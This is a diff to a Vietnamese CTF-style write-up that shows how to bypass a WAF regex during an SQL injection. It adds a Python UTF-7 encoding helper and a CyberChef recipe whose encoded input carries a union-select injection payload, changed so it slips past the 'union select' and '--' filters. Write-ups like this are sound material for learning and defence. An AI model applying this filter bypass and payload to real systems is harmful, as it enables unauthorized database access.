@@ -20,7 +20,29 @@ Sau khi tạo được payload thử gửi thẳng tới backend, ở đây mìn
 
 Thành công exploit sqli
 
-Tiếp theo là bypass waf. Thường thì có một số kỹ thuật bypass waf như là encode payload, nối hoặc ngắt câu lệnh bằng cách chèn comment. Với regex như trên thì chỉ có thể là encode payload
+Tiếp theo là bypass waf. Thường thì có một số kỹ thuật bypass waf như là encode payload, nối hoặc ngắt câu lệnh bằng cách chèn comment. Với regex như trên thì chỉ có thể là encode payload. 
+
+Ở đây mình sử dụng encode [utf-7](https://en.wikipedia.org/wiki/UTF-7) phần body bằng cách thêm `;charset=utf7`
+Nhưng do gặp các ký tự thuộc bảng mã ascii thì vẫn được giữ nguyên nên mình có viết script để encode các ký tự này.
+
+```py
+import base64
+def base64_encode_utf7(text):
+    utf16_bytes = text.encode('utf-16be')
+    base64_bytes = base64.b64encode(utf16_bytes)
+    base64_str = base64_bytes.decode().replace("/", ",")
+    return '+'+base64_str.rstrip("=")+'-'
+```
+Encode ký tự 's' và '-' để bypass regex `union select` và `--`
+
+![image](https://github.com/user-attachments/assets/9d7e4bd6-af7e-43cd-9f7a-85d8b8caa7b2)
+
+Thực hiện encode utf7 và replace. [ricipe](https://cyberchef.org/#recipe=Encode_text('UTF-7%20(65000)')Find_/_Replace(%7B'option':'Simple%20string','string':'select'%7D,'%2BAHM-elect',true,true,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'%2BACA---'%7D,'%2BACA-%2BAC0-%2BAC0-',true,false,true,false)&input=JyB1bmlvbiBzZWxlY3QgMSwgJ2FkbWluJywgKHNlbGVjdCByZXBsYWNlKHJlcGxhY2UoJyIgdW5pb24gc2VsZWN0IDEsICJhZG1pbiIsIChzZWxlY3QgcmVwbGFjZShyZXBsYWNlKCIkIixjaGFyKDM0KSxjaGFyKDM5KSksY2hhcigzNiksIiQiKSkgLS0nLGNoYXIoMzQpLGNoYXIoMzkpKSxjaGFyKDM2KSwnIiB1bmlvbiBzZWxlY3QgMSwgImFkbWluIiwgKHNlbGVjdCByZXBsYWNlKHJlcGxhY2UoIiQiLGNoYXIoMzQpLGNoYXIoMzkpKSxjaGFyKDM2KSwiJCIpKSAtLScpKSAtLQ)
+
+![image](https://github.com/user-attachments/assets/de1e8ab4-3c4e-447d-9d01-e938eb107279)
+
+![image](https://github.com/user-attachments/assets/fdbc7736-833f-407a-ae8f-26b2e42e4f45)
+
 
 
 
